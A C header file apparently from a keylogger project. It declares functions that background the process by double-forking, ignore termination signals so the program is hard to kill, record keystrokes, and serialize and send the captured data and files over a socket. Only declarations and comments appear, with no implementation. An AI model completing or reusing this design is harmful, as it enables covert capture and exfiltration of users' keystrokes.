#pragma once

#include <netinet/in.h>  // sockaddr_in
#include <stdio.h>       // FILE

#include "keylogger.h"

/**
 * Background a process
 *
 * Fork a process twice, meanwhile changing the working directory,
 * file creation permissions, and calling a function to ignore
 * standard process termination signals. At the end of the process,
 * both parent processes will have exited and the grandchild process
 * will have a new process group ID, continuing the program alone,
 * unable to recieve signals sent to the grandparent process.
 *
 * Does not return anything.
 *
 * **/
void background_process(void);

/**
 * Redirect common termination signals
 *
 * Redirect the default implementation of SIGTERM, SIGINT,SIGHUP,
 * and SIGABRT to a custom signal handling function which ignores
 * the termination signals until enough individual signals are sent.
 *
 * Does not return anything.
 *
 * **/
void immortalize(void);

/**
 * Ignore a signal until a global counter is high enough
 *
 * Completely ignore a recieved signal until five signals are sent.
 * If more than 5 signals are sent, raise SIGKILL and end the program.
 *
 * @param signal An integer corresponding to the signal code
 *  of the signal being handled
 *
 * Does not return anything.
 *
 * **/
void shutdown_signal(int signal);

int serialize(FILE* socket_file, key_package* packet);

/**
 * Runs an infinite loop to store user keystrokes.
 *
 * Can be exited with the `c` key. Upon exit, writes all keys into the
 * key_package struct, in chronological order.
 *
 * @param key_package A pointer to a key_package instance. Used to hold an array
 * of key data for the overall session.
 */
// int log_keys(FILE* socket_file, key_package* package);

int send_data(FILE* socket_file, char* file_name);
FILE* get_socket_file(int client_socket);
void try_connect(int client_socket, struct sockaddr_in server_addr);

char* read_file(const char* filename);
